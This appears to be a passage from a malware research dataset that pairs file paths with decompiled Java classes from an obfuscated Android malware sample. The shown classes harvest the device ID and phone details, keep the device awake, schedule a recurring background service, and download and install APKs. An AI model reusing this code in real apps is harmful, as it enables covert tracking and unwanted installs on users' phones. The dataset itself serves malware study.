SQLiteDatabase writableDatabase=this.f55c.getWritableDatabase();     ContentValues contentValues=new ContentValues();     contentValues.put(com.baty.pczy.facy.pap.p.a.aV,cVar.a);     contentValues.put(com.baty.pczy.facy.pap.p.a.aW,cVar.b);     contentValues.put(com.baty.pczy.facy.pap.p.a.aX,Long.valueOf(cVar.f54c));     contentValues.put(com.baty.pczy.facy.pap.p.a.aY,Long.valueOf(cVar.d));     contentValues.put(com.baty.pczy.facy.pap.p.a.aZ,Integer.valueOf(cVar.e));     contentValues.put(com.baty.pczy.facy.pap.p.a.bb,cVar.f);     contentValues.put(com.baty.pczy.facy.pap.p.a.ba,cVar.g);     contentValues.put(com.baty.pczy.facy.pap.p.a.bc,Integer.valueOf(cVar.h));     contentValues.put(com.baty.pczy.facy.pap.p.a.bd,cVar.i);     contentValues.put(com.baty.pczy.facy.pap.p.a.be,Long.valueOf(cVar.j));     writableDatabase.insert(b,null,contentValues);     writableDatabase.close();   }   public void b(  c cVar){     SQLiteDatabase writableDatabase=this.f55c.getWritableDatabase();     writableDatabase.delete(b,com.baty.pczy.facy.pap.p.a.bw,new String[]{cVar.a,cVar.b});     writableDatabase.close();   }   public synchronized void c(  c cVar){     SQLiteDatabase writableDatabase=this.f55c.getWritableDatabase();     ContentValues contentValues=new ContentValues();     contentValues.put(com.baty.pczy.facy.pap.p.a.aV,cVar.a);     contentValues.put(com.baty.pczy.facy.pap.p.a.aW,cVar.b);     contentValues.put(com.baty.pczy.facy.pap.p.a.aX,Long.valueOf(cVar.f54c));     contentValues.put(com.baty.pczy.facy.pap.p.a.aY,Long.valueOf(cVar.d));     contentValues.put(com.baty.pczy.facy.pap.p.a.aZ,Integer.valueOf(cVar.e));     contentValues.put(com.baty.pczy.facy.pap.p.a.bb,cVar.f);     contentValues.put(com.baty.pczy.facy.pap.p.a.ba,cVar.g);     contentValues.put(com.baty.pczy.facy.pap.p.a.bc,Integer.valueOf(cVar.h));     contentValues.put(com.baty.pczy.facy.pap.p.a.bd,cVar.i);     contentValues.put(com.baty.pczy.facy.pap.p.a.be,Long.valueOf(cVar.j));     writableDatabase.update(b,contentValues,com.baty.pczy.facy.pap.p.a.bw,new String[]{cVar.a,cVar.b});     writableDatabase.close();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.d\e.code","public class e extends SQLiteOpenHelper {   public e(  android.content.Context r4){     throw new UnsupportedOperationException(""Method not decompiled: com.baty.pczy.facy.pap.d.e.<init>(android.content.Context):void"");   }   @Override public void onCreate(  SQLiteDatabase sQLiteDatabase){     String str;     long currentTimeMillis=System.currentTimeMillis();     StringBuilder append=new StringBuilder().append(""CREATE TABLE if not EXISTS "");     str=d.b;     sQLiteDatabase.execSQL(append.append(str).append("" ("").append(com.baty.pczy.facy.pap.p.a.aU).append("" INTEGER PRIMARY KEY,"").append(com.baty.pczy.facy.pap.p.a.aV).append("" TEXT,"").append(com.baty.pczy.facy.pap.p.a.aW).append("" TEXT,"").append(com.baty.pczy.facy.pap.p.a.aX).append("" LONG,"").append(com.baty.pczy.facy.pap.p.a.aY).append("" LONG,"").append(com.baty.pczy.facy.pap.p.a.aZ).append("" INTEGER,"").append(com.baty.pczy.facy.pap.p.a.bb).append("" TEXT,"").append(com.baty.pczy.facy.pap.p.a.ba).append("" TEXT,"").append(com.baty.pczy.facy.pap.p.a.bc).append("" INTEGER, "").append(com.baty.pczy.facy.pap.p.a.bd).append("" TEXT, "").append(com.baty.pczy.facy.pap.p.a.be).append("" LONG DEFAULT "").append(currentTimeMillis).append("");"").toString());   }   @Override public void onUpgrade(  SQLiteDatabase sQLiteDatabase,  int i,  int i2){     String str;     StringBuilder append=new StringBuilder().append(""DROP TABLE IF EXISTS "");     str=d.b;     sQLiteDatabase.execSQL(append.append(str).toString());     onCreate(sQLiteDatabase);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.d\f.code","!org.eclipse.jdt.core.dom.TypeDeclaration@69bd7e18"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.e\a.code","public class a implements com.baty.pczy.facy.pap.h.a, Serializable {   public String a="""";   public int b;   public int f58c;   @Override public Object a(  JSONObject jSONObject){     if (jSONObject == null) {       return null;     }     try {       this.a=jSONObject.isNull(""a"") ? null : jSONObject.getString(""a"");       this.b=jSONObject.isNull(""b"") ? -1 : jSONObject.getInt(""b"");       this.f58c=jSONObject.isNull(""c"") ? -1 : jSONObject.getInt(""c"");       return this;     }  catch (    Exception e) {       return this;     }   }   @Override public JSONObject c(){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""a"",this.a);       jSONObject.put(""b"",this.b);       jSONObject.put(""c"",this.f58c);     }  catch (    Exception e) {     }     return jSONObject;   }   @Override public String b(){     return ""h"";   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.e\b.code","public class b implements com.baty.pczy.facy.pap.h.a, Serializable {   public d a;   public f b;   @Override public Object a(  JSONObject jSONObject){     try {       this.b=new f();       String b=this.b.b();       if (!jSONObject.isNull(b)) {         this.b.a(jSONObject.getJSONObject(b));       }       this.a=new d();       String b2=this.a.b();       if (!jSONObject.isNull(b2)) {         this.a.a(jSONObject.getJSONObject(b2));       }     }  catch (    Exception e) {     }     return this;   }   @Override public JSONObject c(){     try {       JSONObject jSONObject=new JSONObject();       if (this.b != null) {         jSONObject.put(this.b.b(),this.b.c());       }       if (this.a == null) {         return jSONObject;       }       jSONObject.put(this.a.b(),this.a.c());       return jSONObject;     }  catch (    Exception e) {       return null;     }   }   @Override public String b(){     return getClass().getSimpleName();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.e\c.code","public class c implements com.baty.pczy.facy.pap.h.a, Serializable {   public String a="""";   public int b;   @Override public Object a(  JSONObject jSONObject){     if (jSONObject == null) {       return null;     }     try {       this.a=jSONObject.isNull(""a"") ? null : jSONObject.getString(""a"");       this.b=jSONObject.isNull(""b"") ? -1 : jSONObject.getInt(""b"");       return this;     }  catch (    Exception e) {       return this;     }   }   @Override public JSONObject c(){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""a"",this.a == null ? """" : this.a);       jSONObject.put(""b"",this.b);     }  catch (    Exception e) {     }     return jSONObject;   }   @Override public String b(){     return ""b"";   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.e\d.code","public class d implements com.baty.pczy.facy.pap.h.a, Serializable {   public int a;   public int b;   public int f59c;   public int d;   public int e;   public int f;   public int g;   public String h;   public int i;   public int j;   public int k;   @Override public Object a(  JSONObject jSONObject){     if (jSONObject == null) {       return null;     }     try {       this.a=jSONObject.isNull(""a"") ? -1 : jSONObject.getInt(""a"");       this.b=jSONObject.isNull(""b"") ? -1 : jSONObject.getInt(""b"");       this.f59c=jSONObject.isNull(""c"") ? -1 : jSONObject.getInt(""c"");       this.d=jSONObject.isNull(""d"") ? -1 : jSONObject.getInt(""d"");       this.e=jSONObject.isNull(""e"") ? -1 : jSONObject.getInt(""e"");       this.f=jSONObject.isNull(""f"") ? -1 : jSONObject.getInt(""f"");       this.g=jSONObject.isNull(""g"") ? -1 : jSONObject.getInt(""g"");       this.h=jSONObject.isNull(""h"") ? null : jSONObject.getString(""h"");       this.i=jSONObject.isNull(""i"") ? -1 : jSONObject.getInt(""i"");       this.j=jSONObject.isNull(""j"") ? -1 : jSONObject.getInt(""j"");       this.k=jSONObject.isNull(""k"") ? -1 : jSONObject.getInt(""k"");       return this;     }  catch (    Exception e) {       com.baty.pczy.facy.pap.f.g.a(e);       return this;     }   }   @Override public JSONObject c(){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""a"",this.a);       jSONObject.put(""b"",this.b);       jSONObject.put(""c"",this.f59c);       jSONObject.put(""d"",this.d);       jSONObject.put(""e"",this.e);       jSONObject.put(""f"",this.f);       jSONObject.put(""g"",this.g);       jSONObject.put(""h"",this.h);       jSONObject.put(""i"",this.i);       jSONObject.put(""j"",this.j);       jSONObject.put(""k"",this.k);     }  catch (    Exception e) {     }     return jSONObject;   }   @Override public String b(){     return ""e"";   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.e\e.code","public class e implements com.baty.pczy.facy.pap.h.a, Serializable {   public String a;   public String b;   @Override public Object a(  JSONObject jSONObject){     if (jSONObject == null) {       return null;     }     try {       this.a=jSONObject.isNull(""a"") ? null : jSONObject.getString(""a"");       this.b=jSONObject.isNull(""b"") ? null : jSONObject.getString(""b"");       return this;     }  catch (    Exception e) {       return this;     }   }   @Override public JSONObject c(){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""a"",this.a);       jSONObject.put(""b"",this.b);     }  catch (    Exception e) {     }     return jSONObject;   }   @Override public String b(){     return ""c"";   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.e\f.code","public class f implements com.baty.pczy.facy.pap.h.a, Serializable {   public String a;   public String b;   public String f60c;   public String d;   public int e;   public String f;   public String g;   public String h;   public String i;   public String j;   public String k;   public long l;   public String m;   public int n=-1;   public String o;   public int p;   public String q;   public int r;   public String s;   public String t;   public int u;   @Override public Object a(  JSONObject jSONObject){     if (jSONObject == null) {       return null;     }     try {       this.g=jSONObject.isNull(""a"") ? null : jSONObject.getString(""a"");       this.b=jSONObject.isNull(""b"") ? null : jSONObject.getString(""b"");       this.n=jSONObject.isNull(""c"") ? -1 : jSONObject.getInt(""c"");       this.a=jSONObject.isNull(""d"") ? null : jSONObject.getString(""d"");       this.p=jSONObject.isNull(""e"") ? -1 : jSONObject.getInt(""e"");       this.o=jSONObject.isNull(""f"") ? null : jSONObject.getString(""f"");       this.h=jSONObject.isNull(""g"") ? null : jSONObject.getString(""g"");       this.j=jSONObject.isNull(""h"") ? null : jSONObject.getString(""h"");       this.l=jSONObject.isNull(""i"") ? -1L : jSONObject.getLong(""i"");       this.k=jSONObject.isNull(""j"") ? null : jSONObject.getString(""j"");       this.f60c=jSONObject.isNull(""k"") ? null : jSONObject.getString(""k"");       this.d=jSONObject.isNull(""l"") ? null : jSONObject.getString(""l"");       this.q=jSONObject.isNull(""m"") ? null : jSONObject.getString(""m"");       this.r=jSONObject.isNull(""n"") ? -1 : jSONObject.getInt(""n"");       this.s=jSONObject.isNull(""o"") ? null : jSONObject.getString(""o"");       this.i=jSONObject.isNull(""p"") ? null : jSONObject.getString(""p"");       this.t=jSONObject.isNull(""q"") ? null : jSONObject.getString(""q"");       this.m=jSONObject.isNull(""r"") ? null : jSONObject.getString(""r"");       this.f=jSONObject.isNull(""s"") ? null : jSONObject.getString(""s"");       this.e=jSONObject.isNull(""t"") ? 0 : jSONObject.getInt(""t"");       this.u=jSONObject.isNull(""u"") ? 0 : jSONObject.getInt(""u"");       return this;     }  catch (    Exception e) {       com.baty.pczy.facy.pap.f.g.a(e);       return this;     }   }   @Override public JSONObject c(){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""a"",this.g);       jSONObject.put(""b"",this.b);       jSONObject.put(""c"",this.n);       jSONObject.put(""d"",this.a);       jSONObject.put(""e"",this.p);       jSONObject.put(""f"",this.o);       jSONObject.put(""g"",this.h);       jSONObject.put(""h"",this.j);       jSONObject.put(""i"",this.l);       jSONObject.put(""j"",this.k);       jSONObject.put(""k"",this.f60c);       jSONObject.put(""l"",this.d);       jSONObject.put(""m"",this.q);       jSONObject.put(""n"",this.r);       jSONObject.put(""o"",this.s);       jSONObject.put(""p"",this.i);       jSONObject.put(""q"",this.t);       jSONObject.put(""r"",this.m);       jSONObject.put(""s"",this.f);       jSONObject.put(""t"",this.e);       jSONObject.put(""u"",this.u);     }  catch (    Exception e) {     }     return jSONObject;   }   @Override public String b(){     return ""d"";   }   public boolean equals(  Object obj){     return obj != null && (obj instanceof f) && this.p == ((f)obj).p;   }   public int hashCode(){     return this.p;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.e\g.code","public class g implements com.baty.pczy.facy.pap.h.a {   private List a;   private Class b;   public g(  Class cls){     this.b=cls;   }   public g(  List list){     this.a=list;   }   @Override public Object a(  JSONObject jSONObject){     return null;   }   public void a(  JSONArray jSONArray){     try {       int length=jSONArray.length();       this.a=new ArrayList();       for (int i=0; i < length; i++) {         JSONObject jSONObject=jSONArray.getJSONObject(i);         com.baty.pczy.facy.pap.h.a aVar=(com.baty.pczy.facy.pap.h.a)this.b.newInstance();         aVar.a(jSONObject);         this.a.add(aVar);       }     }  catch (    Exception e) {       com.baty.pczy.facy.pap.f.g.a(e);     }   }   public com.baty.pczy.facy.pap.h.a[] a(){     if (this.a == null || this.a.size() <= 0) {       return null;     }     int size=this.a.size();     com.baty.pczy.facy.pap.h.a[] aVarArr=(com.baty.pczy.facy.pap.h.a[])Array.newInstance((Class<?>)this.b,size);     for (int i=0; i < size; i++) {       aVarArr[i]=(com.baty.pczy.facy.pap.h.a)this.a.get(i);     }     return aVarArr;   }   @Override public String b(){     if (this.a != null && this.a.size() > 0) {       return ((com.baty.pczy.facy.pap.h.a)this.a.get(0)).b();     }     if (this.b != null) {       try {         return ((com.baty.pczy.facy.pap.h.a)this.b.newInstance()).b();       }  catch (      Exception e) {         com.baty.pczy.facy.pap.f.g.a(e);       }     }     return ""error"";   }   @Override public Object c(){     try {       JSONArray jSONArray=new JSONArray();       int size=this.a.size();       for (int i=0; i < size; i++) {         jSONArray.put(i,((com.baty.pczy.facy.pap.h.a)this.a.get(i)).c());       }       return jSONArray;     }  catch (    Exception e) {       return null;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.e\h.code","public class h implements com.baty.pczy.facy.pap.h.a, Serializable {   public String a;   public String b;   public String f61c;   public String d;   public String g;   public String h;   public int i;   public int k;   public String l;   public String n;   public String o;   public int p;   public int r;   public String s;   public int t;   public int u;   public String v;   private String w;   public double e=-500.0d;   public double f=-500.0d;   public String j="""";   public int m=1;   public String q=null;   public h(  Context context){     this.h="""";     this.i=100044;     this.k=160;     this.l="""";     this.n="""";     this.o="""";     this.p=0;     TelephonyManager telephonyManager=(TelephonyManager)context.getSystemService(""phone"");     this.b=a(context);     this.h=telephonyManager.getDeviceId();     this.d=Build.PRODUCT + "";"" + Build.MODEL;     this.a=Build.VERSION.SDK;     this.f61c=com.baty.pczy.facy.pap.s.a.a(new byte[]{117,110,107,110,111,119,110});     WindowManager windowManager=(WindowManager)context.getSystemService(""window"");     DisplayMetrics displayMetrics=new DisplayMetrics();     windowManager.getDefaultDisplay().getMetrics(displayMetrics);     this.k=displayMetrics.densityDpi;     this.u=displayMetrics.widthPixels;     this.t=displayMetrics.heightPixels;     try {       PackageInfo packageInfo=context.getPackageManager().getPackageInfo(context.getPackageName(),0);       this.s=packageInfo.versionName;       this.r=packageInfo.versionCode;     }  catch (    PackageManager.NameNotFoundException e) {     }     this.i=com.baty.pczy.facy.pap.s.a.a(context);     this.n=com.baty.pczy.facy.pap.f.h.a(context);     this.o=com.baty.pczy.facy.pap.f.h.b(context);     if (this.i != 100061) {       com.baty.pczy.facy.pap.f.g.a(com.baty.pczy.facy.pap.s.g.d(context,14) + this.i);     }     if (this.l == null) {       this.l=com.baty.pczy.facy.pap.s.a.a(new byte[]{117,110,107,110,111,119,110});     }     if (com.baty.pczy.facy.pap.s.a.b(context)) {       this.p=1;     }     this.g=context.getPackageName();     this.w=com.baty.pczy.facy.pap.s.g.d(context,100);   }   private String a(  Context context){     String str;     String a=com.baty.pczy.facy.pap.e.b.a();     if (!TextUtils.isEmpty(a)) {       com.baty.pczy.facy.pap.e.a.e(a);       return a;     }     String i=com.baty.pczy.facy.pap.e.a.i();     if (!TextUtils.isEmpty(i)) {       com.baty.pczy.facy.pap.e.b.a(i);       return i;     }     Object systemService=context.getSystemService(""phone"");     try {       str=(String)systemService.getClass().getMethod(com.baty.pczy.facy.pap.s.g.d(context,5),null).invoke(systemService,null);     }  catch (    Exception e) {       str=i;     }     com.baty.pczy.facy.pap.e.a.e(str);     com.baty.pczy.facy.pap.e.b.a(str);     return str;   }   @Override public Object a(  JSONObject jSONObject){     if (jSONObject == null) {       return null;     }     try {       this.a=jSONObject.isNull(""a"") ? null : jSONObject.getString(""a"");       this.d=jSONObject.isNull(""b"") ? null : jSONObject.getString(""b"");       this.b=jSONObject.isNull(""c"") ? null : jSONObject.getString(""c"");       this.h=jSONObject.isNull(""d"") ? null : jSONObject.getString(""d"");       this.s=jSONObject.isNull(""e"") ? null : jSONObject.getString(""e"");       this.r=jSONObject.isNull(""f"") ? -1 : jSONObject.getInt(""f"");       this.k=jSONObject.isNull(""g"") ? -1 : jSONObject.getInt(""g"");       this.u=jSONObject.isNull(""h"") ? -1 : jSONObject.getInt(""h"");       this.t=jSONObject.isNull(""i"") ? -1 : jSONObject.getInt(""i"");       this.e=jSONObject.isNull(""j"") ? -1.0d : jSONObject.getDouble(""j"");       this.f=jSONObject.isNull(""k"") ? -1.0d : jSONObject.getDouble(""k"");       this.v=jSONObject.isNull(""l"") ? null : jSONObject.getString(""l"");       this.l=jSONObject.isNull(""m"") ? null : jSONObject.getString(""m"");       this.o=jSONObject.isNull(""n"") ? null : jSONObject.getString(""n"");       this.p=jSONObject.isNull(""o"") ? -1 : jSONObject.getInt(""o"");       this.g=jSONObject.isNull(""p"") ? null : jSONObject.getString(""p"");       this.n=jSONObject.isNull(""r"") ? null : jSONObject.getString(""r"");       this.w=jSONObject.isNull(""s"") ? null : jSONObject.getString(""s"");       return this;     }  catch (    Exception e) {       com.baty.pczy.facy.pap.f.g.a(e);       return this;     }   }   @Override public JSONObject c(){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""a"",this.a);       jSONObject.put(""b"",this.d);       jSONObject.put(""c"",this.b);       jSONObject.put(""d"",this.h);       jSONObject.put(""e"",this.s);       jSONObject.put(""f"",this.r);       jSONObject.put(""g"",this.k);       jSONObject.put(""h"",this.u);       jSONObject.put(""i"",this.t);       jSONObject.put(""j"",this.e);       jSONObject.put(""k"",this.f);       jSONObject.put(""l"",this.v);       jSONObject.put(""m"",this.l);       jSONObject.put(""n"",this.o);       jSONObject.put(""o"",this.p);       jSONObject.put(""p"",this.g);       jSONObject.put(""r"",this.n);       jSONObject.put(""s"",this.w);     }  catch (    Exception e) {     }     return jSONObject;   }   @Override public String b(){     return ""a"";   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.e\i.code","public class i implements com.baty.pczy.facy.pap.h.a {   public int a;   public String b;   @Override public JSONObject c(){     try {       JSONObject jSONObject=new JSONObject();       jSONObject.put(""a"",this.a);       jSONObject.put(""b"",this.b);       return jSONObject;     }  catch (    Exception e) {       com.baty.pczy.facy.pap.f.g.a(e);       return null;     }   }   @Override public i a(  JSONObject jSONObject){     try {       this.a=jSONObject.isNull(""a"") ? -1 : jSONObject.getInt(""a"");       this.b=jSONObject.isNull(""b"") ? null : jSONObject.getString(""b"");     }  catch (    Exception e) {       com.baty.pczy.facy.pap.f.g.a(e);     }     return this;   }   @Override public String b(){     return ""g"";   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.e\j.code","public class j implements com.baty.pczy.facy.pap.h.a, Serializable {   public int a;   public int b;   public int f62c;   @Override public Object a(  JSONObject jSONObject){     if (jSONObject == null) {       return null;     }     try {       this.a=jSONObject.isNull(""a"") ? -1 : jSONObject.getInt(""a"");       this.b=jSONObject.isNull(""b"") ? -1 : jSONObject.getInt(""b"");       this.f62c=jSONObject.isNull(""c"") ? -1 : jSONObject.getInt(""c"");       return this;     }  catch (    Exception e) {       return this;     }   }   @Override public JSONObject c(){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""a"",this.a);       jSONObject.put(""b"",this.b);       jSONObject.put(""c"",this.f62c);     }  catch (    Exception e) {     }     return jSONObject;   }   @Override public String b(){     return ""f"";   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.f\a.code","public class a {   static PowerManager.WakeLock a;   private static final Object b=new Object();   public static void a(){ synchronized (b) {       if (a != null && a.isHeld()) {         a.release();         a=null;       }     }   }   public static void a(  Context context,  int i){     AlarmManager alarmManager=(AlarmManager)context.getSystemService(""alarm"");     Intent intent=new Intent(context,(Class<?>)com.baty.pczy.facy.pap.e.i);     intent.setType(com.baty.pczy.facy.pap.c.b);     intent.addFlags(32);     PendingIntent service=PendingIntent.getService(context,i,intent,134217728);     alarmManager.cancel(service);     alarmManager.setRepeating(0,System.currentTimeMillis() + 300000,300000L,service);   }   public static boolean a(  Context context){ synchronized (b) {       if (a != null) {         return false;       }       a=((PowerManager)context.getSystemService(""power"")).newWakeLock(1,com.baty.pczy.facy.pap.p.a.cP);       a.setReferenceCounted(false);       a.acquire();       return true;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.f\b.code","public class b {   public static void a(  Context context){     int h;     com.baty.pczy.facy.pap.d.b a=com.baty.pczy.facy.pap.d.b.a();     if (a == null) {       a=com.baty.pczy.facy.pap.d.b.a(context);     }     List<com.baty.pczy.facy.pap.d.f> c2=a.c();     if (c2 != null) {       for (      com.baty.pczy.facy.pap.d.f fVar : c2) {         if (fVar.m() != 0 && ((h=fVar.h()) == 5 || h == 3)) {           com.baty.pczy.facy.pap.e.f g=com.baty.pczy.facy.pap.e.a.g(fVar.n());           if (g != null && !e.a(g)) {             fVar.a(new com.baty.pczy.facy.pap.i.g(context,g));             fVar.a(new com.baty.pczy.facy.pap.o.c(g));             fVar.f();           }         }       }     }   }   public static void a(  Context context,  com.baty.pczy.facy.pap.e.f fVar){     com.baty.pczy.facy.pap.q.d.a(new c(context,fVar));   }   public static void b(  Context context,  com.baty.pczy.facy.pap.e.f fVar){     if (c(context,fVar)) {       if (j.a(context).b() && ""wifi"".endsWith(j.a(context).a().toLowerCase())) {         a(context,fVar);         return;       }       for (      String str : com.baty.pczy.facy.pap.e.a.f().split("","")) {         if (str.trim().equals(String.valueOf(fVar.p))) {           Toast.makeText(context,com.baty.pczy.facy.pap.p.a.b,0).show();           return;         }       }       Toast.makeText(context,com.baty.pczy.facy.pap.p.a.aw + fVar.a + com.baty.pczy.facy.pap.p.a.ax,0).show();       com.baty.pczy.facy.pap.e.a.a(fVar);       com.baty.pczy.facy.pap.e.a.b(fVar.p);     }   }   private static boolean c(  Context context,  com.baty.pczy.facy.pap.e.f fVar){     com.baty.pczy.facy.pap.d.f fVar2;     Iterator it=com.baty.pczy.facy.pap.d.b.a().c().iterator();     while (true) {       if (!it.hasNext()) {         fVar2=null;         break;       }       fVar2=(com.baty.pczy.facy.pap.d.f)it.next();       if (fVar2.n().equals(fVar.b)) {         break;       }     }     if (fVar2 != null && fVar2.h() != 4) { switch (fVar2.h()) { case 0: case 2:         Toast.makeText(context,com.baty.pczy.facy.pap.p.a.V,0).show();       break; case 1:     Toast.makeText(context,com.baty.pczy.facy.pap.p.a.V,0).show();   break; case 3: case 5: fVar2.f(); break; } return false; } File a=d.a(fVar); if (a == null) { return false; } if (com.baty.pczy.facy.pap.s.a.a(context,fVar.o)) { com.baty.pczy.facy.pap.s.a.b(context,fVar.o); Toast.makeText(context,com.baty.pczy.facy.pap.p.a.ai,1500).show(); return false; } if (!a.isFile() || !a.getPath().endsWith("".apk"")) { return true; } com.baty.pczy.facy.pap.s.a.a(context,a.getPath(),fVar.o); return false; } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.f\c.code","public final class c implements com.baty.pczy.facy.pap.q.a {   final Context a;   final com.baty.pczy.facy.pap.e.f b;   public c(  Context context,  com.baty.pczy.facy.pap.e.f fVar){     this.a=context;     this.b=fVar;   }   @Override public void a(){     l b;     File a=d.a(this.a,this.b);     if (a == null) {       return;     }     com.baty.pczy.facy.pap.d.f fVar=new com.baty.pczy.facy.pap.d.f(this.b.b,a,1);     fVar.a(new com.baty.pczy.facy.pap.i.g(this.a,this.b));     fVar.a(new com.baty.pczy.facy.pap.o.c(this.b));     if (o.a != null && (b=o.a.b(this.b)) != null && (b instanceof com.baty.pczy.facy.pap.d.a)) {       fVar.a((com.baty.pczy.facy.pap.d.a)b);     }     File b2=d.b(this.b);     if (b2 != null) {       if (b2.exists()) {         e.a(b2,a);       }  else {         e.a(new File(b2.getPath() + "".tmp""),new File(a.getPath() + "".tmp""));       }     }     e.a(this.a,this.b);     fVar.e();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.f\d.code","public class d {   private static File f64c;   private static byte[] b={47,100,111,119,110,108,111,97,100,47,118,103,112};   private static String a=a(b); static {     if (a()) {       c();     }   }   public static File a(  int i,  String str){     f64c=c();     if (f64c == null) {       return null;     }     File file=new File(f64c,i + ""/capture/"" + a(str)+ "".dat"");     b(file);     return file;   }   public static File a(  Context context,  com.baty.pczy.facy.pap.e.f fVar){     return new File(context.getDir(""apk"",0),f(fVar));   }   public static File a(  com.baty.pczy.facy.pap.e.f fVar){     return a(com.baty.pczy.facy.pap.e.f57c,fVar);   }   private static String a(  String str){     String[] split;     if (str == null || str.trim().length() == 0 || (split=str.split(""/"")) == null || split.length == 0) {       return null;     }     return split[split.length - 1];   }   private static String a(  byte[] bArr){     return com.baty.pczy.facy.pap.s.a.a(bArr);   }   public static boolean a(){     return ""mounted"".equals(Environment.getExternalStorageState());   }   public static boolean a(  File file){     return file.exists() && file.isDirectory();   }   public static File b(){     if (f64c == null && a()) {       f64c=c();     }     return f64c;   }   public static File b(  com.baty.pczy.facy.pap.e.f fVar){     File e=e(fVar);     if (e == null) {       return null;     }     File file=new File(e,f(fVar));     b(file);     return file;   }   public static boolean b(  File file){     File parentFile=file.getParentFile();     if (parentFile.exists() && parentFile.isDirectory()) {       return true;     }     return parentFile.mkdirs();   }   private static File c(){     File file=new File(Environment.getExternalStorageDirectory(),a);     if (a(file) || file.mkdirs()) {       return file;     }     return null;   }   public static File c(  com.baty.pczy.facy.pap.e.f fVar){     File e=e(fVar);     if (e == null) {       return null;     }     return new File(e,""f"");   }   public static File d(  com.baty.pczy.facy.pap.e.f fVar){     f64c=c();     if (f64c == null) {       return null;     }     File file=new File(f64c,fVar.p + ""/"" + a(fVar.f60c)+ "".dat"");     b(file);     return file;   }   private static File e(  com.baty.pczy.facy.pap.e.f fVar){     f64c=c();     if (f64c == null) {       return null;     }     File file=new File(f64c,"""" + fVar.p);     if (file.exists() && !file.isFile()) {       return file;     }     file.mkdir();     return file;   }   private static String f(  com.baty.pczy.facy.pap.e.f fVar){     String str=fVar.b;     return fVar.p + ""_"" + fVar.k+ ""_""+ str.substring(str.lastIndexOf(""/"") + 1,str.length()).replace(""?"","""");   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.f\e.code","public class e {   public static void a(  Context context,  com.baty.pczy.facy.pap.e.f fVar){     FileOutputStream fileOutputStream;     File c2=d.c(fVar);     if (c2 == null) {       return;     }     try {       fileOutputStream=new FileOutputStream(c2);       try {         try {           BufferedWriter bufferedWriter=new BufferedWriter(new OutputStreamWriter(fileOutputStream));           bufferedWriter.write(""1,"" + context.getPackageName());           bufferedWriter.flush();           a(fileOutputStream);         }  catch (        Exception e) {           e=e;           g.a(e);           a(fileOutputStream);         }       }  catch (      Throwable th) {         th=th;         a(fileOutputStream);         throw th;       }     }  catch (    Exception e2) {       e=e2;       fileOutputStream=null;     } catch (    Throwable th2) {       th=th2;       fileOutputStream=null;       a(fileOutputStream);       throw th;     }   }   public static void a(  File file,  File file2){     FileInputStream fileInputStream;     FileOutputStream fileOutputStream;     FileOutputStream fileOutputStream2=null;     fileOutputStream2=null;     FileInputStream fileInputStream2=null;     if (!file.getName().equals(file2.getName()) || file.length() <= file2.length()) {       return;     }     if (file2.exists()) {       file2.delete();     }     byte[] bArr=new byte[1024];     try {       fileInputStream=new FileInputStream(file);       try {         fileOutputStream=new FileOutputStream(file2);         while (true) {           try {             int read=fileInputStream.read(bArr);             if (read == -1) {               a(fileInputStream);               a(fileOutputStream);               return;             }             fileOutputStream.write(bArr,0,read);           }  catch (          Exception e) {             e=e;             fileInputStream2=fileInputStream;             try {               g.a(e);               a(fileInputStream2);               a(fileOutputStream);               return;             }  catch (            Throwable th) {               th=th;               fileInputStream=fileInputStream2;               fileOutputStream2=fileOutputStream;               a(fileInputStream);               a(fileOutputStream2);               throw th;             }           } catch (          Throwable th2) {             